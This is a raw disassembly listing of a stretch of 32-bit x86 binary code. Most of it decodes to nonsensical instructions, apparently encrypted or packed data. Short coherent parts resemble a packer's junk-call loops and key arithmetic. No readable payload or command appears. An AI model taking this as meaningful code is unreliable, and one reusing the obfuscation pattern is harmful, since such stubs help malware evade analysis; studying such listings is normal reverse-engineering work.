  4049cb:	dec    ebp
  4049cc:	mov    esi,0x2cef09c3
  4049d1:	mov    ah,0x11
  4049d3:	cmp    eax,0xba48da0e
  4049d8:	je     0x40499d
  4049da:	or     eax,0x8ad75bc4
  4049df:	fdivrp st(2),st
  4049e1:	xor    al,0x54
  4049e3:	cmp    DWORD PTR [esi-0x45],edx
  4049e6:	xchg   ebx,eax
  4049e7:	adc    BYTE PTR [edx],al
  4049e9:	daa    
  4049ea:	daa    
  4049eb:	jns    0x404a2a
  4049ed:	adc    eax,0xe23b1a88
  4049f2:	pusha  
  4049f3:	ja     0x404a5f
  4049f5:	mov    esp,0x76b78dd0
  4049fa:	stos   DWORD PTR es:[edi],eax
  4049fb:	sub    eax,DWORD PTR [ecx+0x6c]
  4049fe:	call   0x1be652b3
  404a03:	mov    cl,BYTE PTR [eax-0x61127033]
  404a09:	sti    
  404a0a:	or     al,0x28
  404a0c:	inc    eax
  404a0d:	aas    
  404a0e:	or     eax,DWORD PTR [ebx-0x568d255]
  404a14:	mov    bl,0x0
  404a16:	push   ebx
  404a17:	sbb    ch,al
  404a19:	and    eax,0x45d3d6a2
  404a1e:	jl     0x4049fe
  404a20:	xor    BYTE PTR [edx+0x1e],al
  404a23:	loope  0x404a5f
  404a25:	mov    ss,WORD PTR [edx-0x20]
  404a28:	push   ss
  404a29:	sti    
  404a2a:	not    BYTE PTR [ecx-0x67a1d67e]
  404a30:	sub    ebx,ecx
  404a32:	add    ecx,DWORD PTR [eax]
  404a34:	add    al,0xf5
  404a36:	xor    dh,BYTE PTR [eax]
  404a38:	pop    ebx
  404a39:	retf   
  404a3a:	inc    ebx
  404a3b:	fsubr  st(1),st
  404a3d:	sub    ch,0x9f
  404a40:	rcl    dl,1
  404a42:	cdq    
  404a43:	sub    ah,ah
  404a45:	pop    edi
  404a46:	in     eax,dx
  404a47:	or     BYTE PTR [ebp-0x2c],dl
  404a4a:	fcomp  QWORD PTR [ecx+0x59]
  404a4d:	outs   dx,BYTE PTR ds:[esi]
  404a4e:	jmp    0x16dec7c0
  404a53:	fild   DWORD PTR [ecx-0x42c142e6]
  404a59:	test   DWORD PTR ds:0xcf70ad99,edx
  404a5f:	mov    esi,0xfc007fa
  404a64:	fbstp  TBYTE PTR [edx]
  404a66:	pop    edx
  404a67:	dec    eax
  404a68:	mov    WORD PTR [ebx-0x4a],?
  404a6b:	retf   
  404a6c:	mov    ebp,0xdd0c8c46
  404a71:	jns    0x404a77
  404a73:	mov    eax,0xf6e24b6e
  404a78:	fiadd  WORD PTR [edi+0x21b3e3ad]
  404a7e:	shl    BYTE PTR ds:0xa531f9fa,1
  404a84:	sub    DWORD PTR [edi],0x66d13229
  404a8a:	and    BYTE PTR [eax+0x9],al
  404a8d:	mov    WORD PTR [eax-0x601b8cd9],cs
  404a93:	mov    dh,0xbb
  404a95:	es mov bh,0x17
  404a98:	cmp    al,0x15
  404a9a:	sbb    al,0xcf
  404a9c:	inc    esi
  404a9d:	inc    ebp
  404a9e:	push   ebx
  404a9f:	(bad)  
  404aa0:	in     eax,0xb2
  404aa2:	mov    esi,0xd0a5ab1f
  404aa7:	dec    esi
  404aa8:	mov    ebx,0x9b408495
  404aad:	test   cl,ch
  404aaf:	hlt    
  404ab0:	push   es
  404ab1:	mov    eax,0x775aaf56
  404ab6:	ds add eax,0xeabda796
  404abc:	imul   eax,DWORD PTR [eax],0xffffffbc
  404abf:	stos   BYTE PTR es:[edi],al
  404ac0:	ds sub esi,0xffffffe7
  404ac4:	adc    DWORD PTR [ebx],0xe544e74a
  404aca:	inc    edi
  404acb:	fwait
  404acc:	sub    DWORD PTR [edx+0x42bab93d],ebx
  404ad2:	pop    edx
  404ad3:	sub    ch,BYTE PTR [ebx]
  404ad5:	jp     0x404af7
  404ad7:	pushf  
  404ad8:	cmp    dh,BYTE PTR [esi-0x53]
  404adb:	pop    ss
  404adc:	and    ebp,esi
  404ade:	adc    al,0x7
  404ae0:	repnz and cl,BYTE PTR [edx+eax*2]
  404ae4:	lock gs adc eax,0x2b0727d
  404aeb:	sub    al,0xb5
  404aed:	popa   
  404aee:	lds    ebp,FWORD PTR [edx]
  404af0:	(bad)  
  404af2:	inc    edx
  404af3:	(bad)  
  404af4:	scas   al,BYTE PTR es:[edi]
  404af5:	inc    esi
  404af6:	cdq    
  404af7:	leave  
  404af8:	inc    esi
  404af9:	xchg   esp,ecx
  404afb:	mov    cl,0xcb
  404afd:	ins    BYTE PTR es:[edi],dx
  404afe:	sbb    BYTE PTR [edi-0xc],bh
  404b01:	add    al,0xc5
  404b03:	out    dx,eax
  404b04:	sbb    cl,BYTE PTR [eax+0x64ef75d1]
  404b0a:	repz test eax,0xf0920967
  404b10:	or     ebp,ecx
  404b12:	add    dl,BYTE PTR [esi+esi*2]
  404b15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b16:	test   eax,0x93aaffa4
  404b1b:	jns    0x404ad5
  404b1d:	dec    edi
  404b1e:	xchg   ebp,eax
  404b1f:	or     BYTE PTR [edi],bl
  404b21:	pop    ebp
  404b22:	xor    BYTE PTR [ebp+ebp*2+0x38],bh
  404b26:	or     DWORD PTR [esi],edx
  404b28:	gs sub al,0xc7
  404b2b:	cli    
  404b2c:	cmp    bh,ch
  404b2e:	jns    0x404adc
  404b30:	es lock mov eax,0xb5260fcf
  404b37:	pop    edi
  404b38:	std    
  404b39:	xlat   BYTE PTR ds:[ebx]
  404b3a:	leave  
  404b3b:	pop    ebp
  404b3c:	mov    ebx,0xad2dc5dd
  404b41:	xor    dh,BYTE PTR [ebx-0x431745a5]
  404b47:	das    
  404b48:	loopne 0x404b28
  404b4a:	ja     0x404ba2
  404b4c:	or     eax,0xcb31f6da
  404b51:	pop    esi
  404b53:	out    dx,eax
  404b54:	sar    DWORD PTR [edx-0x41],cl
  404b57:	sbb    eax,0xb38a463d
  404b5c:	push   ss
  404b5d:	and    al,0x8
  404b5f:	test   bh,al
  404b61:	pop    ds
  404b62:	inc    eax
  404b63:	js     0x404bce
  404b65:	gs and ah,bh
  404b68:	xor    ecx,DWORD PTR [edx]
  404b6a:	repz mov esi,0xcf3a0096
  404b70:	lods   eax,DWORD PTR ds:[esi]
  404b71:	out    dx,al
  404b72:	sahf   
  404b73:	mov    edx,0xab661f58
  404b78:	retf   
  404b79:	test   BYTE PTR [edx+edi*4],ah
  404b7c:	addr16 jnp 0x404b70
  404b7f:	sub    DWORD PTR [ebx],ebp
  404b81:	jno    0x404b8f
  404b83:	dec    ecx
  404b84:	mov    ch,0xc4
  404b86:	inc    edx
  404b87:	mov    WORD PTR [edi],?
  404b89:	and    al,0xec
  404b8b:	dec    eax
  404b8c:	imul   ebp,ebp,0x35
  404b8f:	test   DWORD PTR [eax-0x6cb75946],0x5d377342
  404b99:	fisttp DWORD PTR [edx-0x56]
  404b9c:	mov    al,0x5d
  404b9e:	sbb    al,0xe8
  404ba0:	test   al,0x7b
  404ba2:	sbb    cl,al
  404ba4:	push   eax
  404ba5:	xchg   esi,eax
  404ba6:	xchg   edx,eax
  404ba7:	cs div ah
  404baa:	lahf   
  404bab:	jmp    0x734fe8b9
  404bb0:	loope  0x404ba1
  404bb2:	aaa    
  404bb3:	imul   edi,DWORD PTR [ecx-0x14],0x37
  404bb7:	adc    esi,DWORD PTR [eax-0x3a972b35]
  404bbd:	jnp    0x404c3a
  404bbf:	aas    
  404bc0:	push   es
  404bc1:	fwait
  404bc2:	push   esp
  404bc3:	sub    al,0x50
  404bc5:	xchg   edi,eax
  404bc6:	dec    edi
  404bc7:	sbb    cl,ch
  404bc9:	(bad)  
  404bca:	adc    dl,cl
  404bcc:	out    0x3f,al
  404bce:	pop    edi
  404bcf:	and    DWORD PTR [ebx],esi
  404bd1:	sahf   
  404bd2:	add    BYTE PTR [ecx+0x1d],bl
  404bd5:	sahf   
  404bd6:	add    esi,DWORD PTR [ecx-0x3a]
  404bd9:	sbb    esi,ecx
  404bdb:	sub    ah,al
  404bdd:	xchg   DWORD PTR [edi+0x28929171],edi
  404be3:	jmp    0x404b74
  404be5:	jne    0x404c39
  404be7:	lock push eax
  404be9:	les    eax,FWORD PTR [edx+0xa3c4b10]
  404bef:	call   0xe4d7:0x43a2cfb0
  404bf6:	ss mov ecx,esp
  404bf9:	stos   DWORD PTR es:[edi],eax
  404bfa:	mov    BYTE PTR [ebp+0x35746b28],cl
  404c00:	dec    edx
  404c01:	shl    esi,cl
  404c03:	sahf   
  404c04:	xchg   edx,eax
  404c05:	push   es
  404c06:	xchg   ebp,eax
  404c07:	mov    esp,esp
  404c09:	pop    es
  404c0a:	int    0xcc
  404c0c:	mov    gs,esp
  404c0e:	xlat   BYTE PTR ds:[ebx]
  404c0f:	popa   
  404c10:	pop    esi
  404c11:	sbb    al,0x9b
  404c13:	and    eax,0xd2d5e716
  404c18:	(bad)  
  404c19:	in     eax,dx
  404c1a:	xchg   BYTE PTR [ebx+eax*2],cl
  404c1d:	cmc    
  404c1e:	xchg   edx,eax
  404c1f:	lock arpl WORD PTR [ecx-0x7ed5675d],bp
  404c26:	stos   BYTE PTR es:[edi],al
  404c27:	mov    bh,0xa4
  404c29:	xchg   edx,eax
  404c2a:	loope  0x404c6a
  404c2c:	neg    DWORD PTR [eax+edx*8+0x18f37549]
  404c33:	jl     0x404bff
  404c35:	ins    BYTE PTR es:[edi],dx
  404c36:	xor    DWORD PTR [ecx],edx
  404c38:	pop    ds
  404c39:	fxch   st(1)
  404c3b:	out    0x6c,eax
  404c3d:	dec    eax
  404c3e:	int3   
  404c3f:	fcmovnb st,st(3)
  404c42:	call   0xcf79d546
  404c47:	jge    0x404bf6
  404c49:	jp     0x404c7a
  404c4b:	fmul   st(3),st
  404c4d:	fstp   TBYTE PTR [eax+0x48]
  404c50:	ror    esi,0x61
  404c53:	sub    eax,0xfbb8f653
  404c58:	inc    edi
  404c59:	imul   ebp,DWORD PTR [edx],0xffffffdb
  404c5c:	leave  
  404c5d:	popf   
  404c5e:	xchg   di,ax
  404c60:	fimul  WORD PTR [ebx+0x49600835]
  404c66:	jb     0x404c29
  404c68:	jmp    0x4226:0x2a42d8e8
  404c6f:	push   cs
  404c70:	es dec ebp
  404c72:	add    eax,0xa45496ad
  404c77:	push   ecx
  404c78:	xor    al,0xee
  404c7a:	sti    
  404c7b:	cli    
  404c7c:	jae    0x404c99
  404c7e:	aas    
  404c7f:	mov    dh,0x5b
  404c81:	sub    al,0xc1
  404c83:	into   
  404c84:	repz lds edi,FWORD PTR [ebp+0x46]
  404c88:	xor    esp,edi
  404c8a:	xchg   BYTE PTR [ebp-0x78],al
  404c8d:	aaa    
  404c8e:	ins    DWORD PTR es:[edi],dx
  404c8f:	arpl   bx,cx
  404c91:	bnd jb 0x404c28
  404c94:	(bad)  [eax]
  404c96:	je     0x404c5f
  404c98:	sbb    DWORD PTR [eax+0x76],edx
  404c9b:	jno    0x404cd3
  404c9d:	nop
  404c9e:	dec    esp
  404c9f:	xor    esp,DWORD PTR [ebp+0xe247445]
  404ca5:	xor    edx,edx
  404ca7:	scas   eax,DWORD PTR es:[edi]
  404ca8:	sbb    DWORD PTR [edi+0x758ee9cc],edx
  404cae:	or     dh,0x21
  404cb1:	test   al,0x80
  404cb3:	adc    DWORD PTR [ebx],ebp
  404cb5:	pop    esi
  404cb6:	push   0xffffffe0
  404cb8:	inc    eax
  404cb9:	inc    ebx
  404cba:	ror    BYTE PTR [ecx-0x1a3ce7b0],1
  404cc0:	jg     0x404c9b
  404cc2:	repz aad 0xb3
  404cc5:	mov    esp,0x31573eb5
  404cca:	mov    dh,0x41
  404ccc:	push   ebx
  404ccd:	pop    edi
  404cce:	out    dx,eax
  404ccf:	and    eax,0xa15f671
  404cd4:	pop    eax
  404cd5:	test   al,0xa0
  404cd7:	clc    
  404cd8:	mov    eax,0xaca092b8
  404cdd:	popf   
  404cde:	into   
  404cdf:	test   DWORD PTR [eax+ebp*4],0xf1ae3048
  404ce6:	inc    ebp
  404ce7:	push   eax
  404ce8:	mov    ah,0x49
  404cea:	cmp    dl,0x5e
  404ced:	in     eax,0xf1
  404cef:	add    DWORD PTR ds:0x4bbda417,0xffffffd2
  404cf6:	and    dl,BYTE PTR [esi+ebx*1]
  404cf9:	mov    eax,ds:0x8b1f6a0a
  404cfe:	inc    ebp
  404cff:	in     al,dx
  404d00:	add    DWORD PTR [eax],0x705fa8c
  404d06:	mov    eax,DWORD PTR [ebp-0x10]
  404d09:	mov    edx,DWORD PTR [ebp+0x8]
  404d0c:	xor    eax,ecx
  404d0e:	lea    eax,[eax+edx*1+0x327299]
  404d15:	mov    DWORD PTR [ebp+0x8],eax
  404d18:	inc    DWORD PTR [ebp+0xc]
  404d1b:	jmp    0x4040d8
  404d20:	mov    eax,DWORD PTR [ebp-0x10]
  404d23:	xor    eax,ecx
  404d25:	mov    ecx,DWORD PTR [ebp+0x10]
  404d28:	add    eax,esi
  404d2a:	mov    DWORD PTR [ecx],eax
  404d2c:	pop    esi
  404d2d:	leave  
  404d2e:	ret    0xc
  404d31:	push   ebp
  404d32:	mov    ebp,esp
  404d34:	push   ecx
  404d35:	sub    edx,eax
  404d37:	jmp    0x404f34
  404d3c:	pop    edi
  404d3d:	mov    ebx,cs
  404d3f:	and    ebp,edi
  404d41:	jno    0x404dc0
  404d43:	dec    esp
  404d44:	call   0x8faa7d7b
  404d49:	and    esp,DWORD PTR [edi+0x7e2f1b07]
  404d4f:	jle    0x404daf
  404d51:	jg     0x404dd1
  404d53:	jle    0x404db6
  404d55:	iret   
  404d56:	jg     0x404d20
  404d58:	pop    ebp
  404d59:	sbb    edx,DWORD PTR [ebp+0xf]
  404d5c:	adc    ecx,DWORD PTR [ecx-0x36]
  404d5f:	dec    DWORD PTR [ebp-0x79]
  404d62:	fs mov esi,0xd08e1306
  404d68:	xchg   edx,eax
  404d69:	pop    ds
  404d6a:	iret   
  404d6b:	inc    eax
  404d6c:	sub    esi,DWORD PTR [ecx+edi*8+0x23]
  404d70:	pop    esp
  404d71:	add    bh,BYTE PTR [edx+0x4]
  404d74:	fcmovnb st,st(6)
  404d76:	mov    eax,0xdc60fad4
  404d7b:	idiv   DWORD PTR [ebx+0x2b]
  404d7e:	dec    edx
  404d7f:	pop    edx
  404d80:	(bad)  
  404d81:	inc    di
  404d83:	inc    ecx
  404d84:	test   al,0x9b
  404d86:	xchg   esi,eax
  404d87:	or     dh,dh
  404d89:	jo     0x404e0a
  404d8b:	iret   
  404d8c:	cmp    DWORD PTR [edi],0x5a
  404d8f:	jo     0x404df9
  404d91:	xchg   edi,eax
  404d92:	out    0x8a,al
  404d94:	xlat   BYTE PTR ds:[ebx]
  404d95:	out    0x8d,al
  404d97:	cmp    DWORD PTR [edi-0x1],0x53
  404d9b:	icebp  
  404d9c:	sub    DWORD PTR [edi-0x163b0cb2],0x56737185
  404da6:	clc    
  404da7:	fsubr  st(0),st
  404da9:	xchg   ecx,eax
  404daa:	les    ebx,FWORD PTR [ebx-0x78]
  404dad:	stos   BYTE PTR es:[edi],al
  404dae:	outs   dx,BYTE PTR ds:[esi]
  404daf:	sbb    esp,ebx
  404db1:	mov    ebx,DWORD PTR [edx-0x509af5e5]
  404db7:	or     al,0x7b
  404db9:	test   al,0x11
  404dbb:	push   es
  404dbc:	inc    eax
  404dbd:	mov    ecx,0x50c9d70
  404dc2:	dec    BYTE PTR [esi]
  404dc4:	shr    al,1
  404dc6:	or     ebp,DWORD PTR [edx-0xe]
  404dc9:	xor    al,0x1e
  404dcb:	mov    al,ds:0x6d32d67d
  404dd0:	lahf   
  404dd1:	fst    DWORD PTR [ebp+eiz*1+0x1cba20fe]
  404dd8:	fdiv   QWORD PTR [esi-0x51]
  404ddb:	hlt    
  404ddc:	cmp    BYTE PTR [ebx-0x5],ah
  404ddf:	adc    al,0x99
  404de1:	sub    ecx,esi
  404de3:	cli    
  404de4:	pushf  
  404de5:	or     DWORD PTR [edx],0xd46e228e
  404deb:	ror    ah,0x9e
  404dee:	sbb    eax,DWORD PTR [edi-0x7c]
  404df1:	jnp    0x404e1e
  404df3:	sub    al,0xe
  404df5:	(bad)
  404df9:	jno    0x404dc0
  404dfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404dfc:	cmp    eax,0xbaad3512
  404e01:	pop    esp
  404e02:	das    
  404e03:	out    0xe2,al
  404e05:	dec    ecx
  404e06:	fldcw  WORD PTR [ecx]
  404e08:	push   eax
  404e09:	popf   
  404e0a:	into   
  404e0b:	cmp    edi,ebx
  404e0d:	cmp    al,0xb8
  404e0f:	sbb    BYTE PTR [eax],dh
  404e11:	jno    0x404e27
  404e13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e14:	xchg   esi,eax
  404e15:	vcvtsd2ss xmm4,xmm1,QWORD PTR [ecx]
  404e19:	xchg   DWORD PTR [edx-0x62dfba50],ecx
  404e1f:	or     dh,dh
  404e21:	rcr    DWORD PTR [eax],1
  404e23:	loop   0x404e0f
  404e25:	stos   BYTE PTR es:[edi],al
  404e26:	aam    0xdf
  404e28:	out    dx,al
  404e29:	in     al,dx
  404e2a:	sti    
  404e2b:	gs jp  0x404ddf
  404e2e:	(bad)  
  404e2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e30:	jno    0x404ddb
  404e32:	sahf   
  404e33:	pop    ecx
  404e34:	arpl   WORD PTR [edi+edi*8],bp
  404e37:	sub    ecx,DWORD PTR [edx]
  404e39:	ret    0xb481
  404e3c:	pop    esp
  404e3d:	dec    ecx
  404e3e:	mov    eax,ds:0xc3ef09ff
  404e43:	xchg   esi,eax
  404e44:	or     al,0xec
  404e46:	pop    edi
  404e47:	adc    al,0x3b
  404e49:	outs   dx,BYTE PTR ds:[esi]
  404e4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e4b:	cmc    
  404e4c:	es out dx,eax
  404e4e:	test   al,0xcf
  404e50:	mov    edx,0x1bb38066
  404e55:	shl    DWORD PTR ds:0x9bd4c5f,0xe0
  404e5c:	das    
  404e5d:	sbb    eax,0x40cfa8da
  404e62:	xlat   BYTE PTR gs:[ebx]
  404e64:	aad    0xc7
  404e66:	std    
  404e67:	loop   0x404e3b
  404e69:	cmp    al,BYTE PTR [ecx-0x53]
  404e6c:	push   eax
  404e6d:	mov    esp,0x1fcf33b1
  404e72:	nop
  404e73:	mov    DWORD PTR [bp+di],eax
  404e76:	les    ecx,FWORD PTR [edx]
  404e78:	fst    QWORD PTR [edx-0x514e1b4]
  404e7e:	push   cs
  404e7f:	je     0x404eac
  404e81:	mov    eax,0x988974d
  404e86:	dec    esp
  404e87:	adc    eax,DWORD PTR [edi+0x72]
  404e8a:	mov    eax,0x76aabaf5
  404e8f:	fwait
  404e90:	pushf  
  404e91:	xchg   edi,ebp
  404e93:	fucomip st,st(6)
  404e95:	mov    al,0x8
  404e97:	jo     0x404e2f
  404e99:	sbb    al,0xb9
  404e9b:	fisubr DWORD PTR [eax-0x1ecc7aa5]
  404ea1:	jp     0x404f06
  404ea3:	cmp    dh,BYTE PTR [edx]
  404ea5:	je     0x404ec4
  404ea7:	mov    ds:0x473027c0,eax
  404eac:	add    cl,BYTE PTR [edx-0x6a0ff6b6]
  404eb2:	lea    esp,[esi]
  404eb4:	retf   
  404eb5:	int    0xc6
  404eb7:	cmp    BYTE PTR [edx-0x3a],bl
  404eba:	sbb    bl,cl
  404ebc:	mov    eax,ds:0xf755ff03
  404ec1:	mov    ah,0x4a
  404ec3:	jbe    0x404f3a
  404ec5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ec6:	jge    0x404e4f
  404ec8:	out    0x35,al
  404eca:	in     eax,dx
  404ecb:	fadd   DWORD PTR [esi-0x495b875]
  404ed1:	jge    0x404ed6
  404ed3:	int3   
  404ed4:	sbb    DWORD PTR [ecx],ebx
  404ed6:	pop    esp
  404ed7:	repz imul esi,eax,0xdc567879
  404ede:	sub    BYTE PTR [ebp-0x7f4d1a82],0x1e
  404ee5:	or     eax,0x784de4f0
  404eea:	jg     0x404eb3
  404eec:	or     DWORD PTR [esi+0x55],ebx
  404eef:	jmp    0xd2b76483
  404ef4:	xchg   ecx,eax
  404ef5:	sti    
  404ef6:	fwait
  404ef7:	dec    eax
  404ef8:	dec    edi
  404ef9:	pop    ebx
  404efa:	xchg   esi,eax
  404efb:	imul   esi,DWORD PTR [ebp+0x42],0x52bc0274
  404f02:	adc    edi,esi
  404f04:	rcl    DWORD PTR [esp+eax*2-0x52],cl
  404f08:	loopne 0x404f11
  404f0a:	lea    edi,[esi]
  404f0c:	jge    0x404ef8
  404f0e:	mov    edx,0xa05bdd1d
  404f13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f14:	and    DWORD PTR [esi-0x1c93ea96],ebx
  404f1a:	jns    0x404ed1
  404f1c:	and    ebx,DWORD PTR [edx-0x667d90db]
  404f22:	mov    edi,0xda6764bf
  404f27:	jnp    0x404f06
  404f29:	cmp    DWORD PTR [ecx+0x72027699],esp
  404f2f:	and    al,0x5a
  404f32:	or     ebx,DWORD PTR [edx]
  404f34:	push   ecx
  404f35:	or     edx,DWORD PTR ds:0x4345fb
  404f3b:	mov    DWORD PTR [ebp-0x8],0xf89c8536
  404f42:	mov    DWORD PTR ds:0x43468b,0x1c
  404f4c:	cmp    DWORD PTR ds:0x43468b,0x0
  404f53:	je     0x404f94
  404f59:	cmp    DWORD PTR ds:0x43468b,0x21
  404f60:	jne    0x404f84
  404f66:	push   DWORD PTR [ebp-0x24]
  404f69:	push   DWORD PTR [ebp-0x20]
  404f6c:	push   0x26f9
  404f71:	push   0x3d74
  404f76:	push   0x4b4e
  404f7b:	push   DWORD PTR [ebp-0x1c]
  404f7e:	call   DWORD PTR ds:0x413280
  404f84:	mov    eax,ds:0x43468b
  404f89:	dec    eax
  404f8a:	mov    ds:0x43468b,eax
  404f8f:	jmp    0x404f4c
  404f94:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  404f9b:	mov    eax,DWORD PTR [ebp-0x4]
  404f9e:	xor    DWORD PTR ds:0x4345f3,ecx
  404fa4:	push   esi
  404fa5:	and    DWORD PTR ds:0x434693,0x0
  404faf:	mov    edx,DWORD PTR ds:0x434693
  404fb5:	inc    edx
  404fb6:	mov    DWORD PTR ds:0x434693,edx
  404fbc:	cmp    DWORD PTR ds:0x434693,0x21
  404fc3:	jne    0x404fe1
  404fc9:	push   0x434849
  404fce:	push   0x4347ce
  404fd3:	push   0x6321
  404fd8:	push   DWORD PTR [ebp-0x10]
  404fdb:	call   DWORD PTR ds:0x4130bc
  404fe1:	cmp    DWORD PTR ds:0x434693,0x19
  404fe8:	jb     0x404faf
  404fee:	inc    ecx
  404fef:	mov    esi,DWORD PTR [ebp-0x8]
  404ff2:	inc    DWORD PTR ds:0x434637
  404ff8:	mov    edx,0x7510851
  404ffd:	xor    eax,edx
  404fff:	xor    esi,edx
  405001:	mov    ecx,0x327299
  405006:	add    esi,ecx
  405008:	xor    DWORD PTR ds:0x434637,0x55d1
  405012:	add    eax,ecx
  405014:	imul   eax,esi
  405017:	mov    esi,DWORD PTR [ebp+0xc]
  40501a:	cmp    esi,eax
  40501c:	jne    0x405038
  405022:	mov    eax,DWORD PTR [ebp-0x4]
  405025:	mov    esi,DWORD PTR [ebp-0x8]
  405028:	xor    eax,edx
  40502a:	xor    esi,edx
  40502c:	add    eax,ecx
  40502e:	add    esi,ecx
  405030:	imul   eax,esi
  405033:	jmp    0x405270
  405038:	mov    eax,DWORD PTR [ebp+0xc]
  40503b:	mov    eax,DWORD PTR [eax+0x78]
  40503e:	jmp    0x40523b
  405043:	imul   esp,DWORD PTR [eax],0x7d571dbe
  405049:	jge    0x4050b7
  40504b:	push   esp
  40504c:	pop    ds
  40504d:	loopne 0x40508f
  40504f:	sbb    al,0x4
  405051:	jp     0x404fe3
  405053:	jnp    0x40507e
  405055:	jle    0x4050d5
  405057:	pop    esi
  405058:	jg     0x4050d8
  40505a:	jle    0x4050b7
  40505c:	leave  
  40505d:	in     eax,0xc6
  40505f:	sbb    BYTE PTR [edi],0xd0
  405062:	sub    al,0xcc
  405064:	stos   DWORD PTR es:[edi],eax
  405065:	outs   dx,DWORD PTR ds:[esi]
  405066:	jl     0x4050d4
  405068:	arpl   WORD PTR [eax+edx*8],di
  40506b:	outs   dx,BYTE PTR ds:[esi]
  40506c:	mov    eax,ds:0xe4dc14b8
  405071:	xchg   ecx,eax
  405072:	sbb    BYTE PTR [edi+edi*8],dh
  405075:	repnz hlt 
  405077:	leave  
  405078:	retf   
  405079:	in     al,0xd4
  40507b:	xor    DWORD PTR [eax-0x294c55f4],eax
  405081:	mov    ecx,0x2fd4225d
  405086:	mov    al,ds:0xb14db985
  40508b:	sti    
  40508c:	retf   0x113e
  40508f:	iret   
  405090:	(bad)  
  405091:	std    
  405092:	pop    esi
  405093:	xchg   ebp,eax
  405094:	adc    al,0xe8
  405096:	dec    esp
  405097:	repz cmp DWORD PTR [ebp+0x45],0x48d16502
  40509f:	sub    esi,DWORD PTR [ebp+0x39]
  4050a2:	or     eax,0x19649e57
  4050a7:	(bad)
  4050ab:	xchg   esi,eax
  4050ac:	out    dx,eax
  4050ad:	and    ah,0x7
  4050b0:	shl    BYTE PTR [edx+eiz*1+0x69bf941a],0xac
  4050b8:	(bad)  
  4050b9:	aas    
  4050ba:	fist   WORD PTR [esi]
  4050bc:	sub    BYTE PTR [ebx+ebx*4],al
  4050bf:	pop    ebx
  4050c0:	rcr    ecx,cl
  4050c2:	test   eax,0x9136abee
  4050c7:	jmp    0x7414:0xd2cff254
  4050ce:	std    
  4050cf:	in     al,dx
  4050d0:	sbb    cl,BYTE PTR [edi]
  4050d2:	jmp    0x4773:0xa94be814
  4050d9:	xor    al,0xcf
  4050db:	xchg   edi,eax
  4050dc:	mov    bh,0xa3
  4050de:	cwde   
  4050df:	adc    BYTE PTR [ecx],al
  4050e1:	sbb    ch,BYTE PTR [ebx]
  4050e3:	iret   
  4050e4:	in     al,dx
  4050e5:	popf   
  4050e6:	gs rcr ecx,0xdb
  4050ea:	mov    ds,WORD PTR [esi+0x1d]
  4050ed:	sbb    al,0x67
  4050ef:	jne    0x40514d
  4050f1:	inc    esp
  4050f2:	dec    ecx
  4050f3:	pop    edi
  4050f4:	clc    
  4050f5:	data16 std 
  4050f7:	push   ebx
  4050f8:	cdq    
  4050f9:	xor    edx,0x5567daed
  4050ff:	jb     0x405176
  405101:	cmp    BYTE PTR [edi],0xab
  405104:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405105:	cmp    eax,0xf1b69392
  40510a:	cmp    eax,0x846e78c2
  40510f:	sbb    eax,esi
  405111:	xchg   ebp,eax
  405112:	push   eax
  405113:	test   eax,0x58947886
  405118:	xor    BYTE PTR [ebx-0x55],ch
  40511b:	xchg   ebx,eax
  40511c:	and    esp,DWORD PTR [edi]
  40511e:	into   
  40511f:	push   edx
  405120:	pop    esp
  405121:	xchg   DWORD PTR [eax],ecx
  405123:	push   0xffffffee
  405125:	ds pop ecx
  405127:	adc    ecx,DWORD PTR [eax+0x5c]
  40512a:	xor    al,0xe4
  40512c:	cmp    bh,BYTE PTR [ebx]
  40512e:	js     0x4050ea
  405130:	mov    al,ds:0x372148c3
  405135:	add    BYTE PTR [edx],0x99
  405138:	test   al,0x50
  40513a:	ins    DWORD PTR es:[edi],dx
  40513b:	sub    BYTE PTR [edx],dl
  40513d:	bound  ecx,QWORD PTR [edi-0x4f]
  405140:	xor    dh,BYTE PTR [ebx]
  405142:	std    
  405143:	and    esp,ebp
  405145:	adc    DWORD PTR [ebx+0x42],ebx
  405148:	push   edx
  405149:	jmp    0xc0c538e7
  40514e:	cmp    ah,BYTE PTR [ebx+edx*2]
  405151:	scas   al,BYTE PTR es:[edi]
  405152:	ins    BYTE PTR es:[edi],dx
  405153:	cmp    BYTE PTR [edi-0x7599af4a],ch
  405159:	cld    
  40515a:	cmovl  ebx,DWORD PTR [ebx+0x12a7874e]
  405161:	scas   eax,DWORD PTR es:[edi]
  405162:	push   0xffffffa9
  405164:	push   ecx
  405165:	xlat   BYTE PTR ds:[ebx]
  405166:	cmp    ecx,ebp
  405168:	xchg   edi,eax
  405169:	hlt    
  40516a:	les    eax,FWORD PTR [eax+0x3c]
  40516d:	xor    BYTE PTR [edi+0x7f],bh
  405170:	sbb    al,0x3a
  405172:	jae    0x4051d0
  405174:	arpl   WORD PTR [esi-0x704aa99e],bx
  40517a:	popa   
  40517b:	sbb    al,0xc9
  40517d:	or     al,0x42
  40517f:	mov    ah,0xbc
  405181:	mov    dl,0x50
  405183:	sub    ebx,esi
  405185:	addr16 test ecx,esp
  405188:	call   0x18709867
  40518d:	inc    esi
  40518e:	add    DWORD PTR [edx],0x79df8b86
  405194:	jne    0x40516a
  405196:	adc    DWORD PTR [edx-0x33],eax
  405199:	xchg   esi,eax
  40519a:	sbb    DWORD PTR [ecx+ecx*2+0x6d],ebx
  40519e:	das    
  40519f:	int3   
  4051a0:	push   eax
  4051a1:	jle    0x4051f1
  4051a3:	cwde   
  4051a4:	dec    ecx
  4051a5:	dec    ecx
  4051a6:	fxch   st(6)
  4051a8:	lahf   
  4051a9:	stos   BYTE PTR es:[edi],al
  4051aa:	xor    al,0x89
  4051ac:	test   eax,0xa4ad2400
  4051b1:	add    edx,ecx
  4051b3:	jo     0x40519a
  4051b5:	mov    ds:0xa84eaa6b,al
  4051ba:	arpl   WORD PTR [edi],bx
  4051bc:	adc    al,0x28
  4051be:	ja     0x4051c2
  4051c0:	in     al,0xa5
  4051c2:	xchg   BYTE PTR ss:[ecx+0x4b],ah
  4051c6:	fst    DWORD PTR [edi+0x82d44e7]
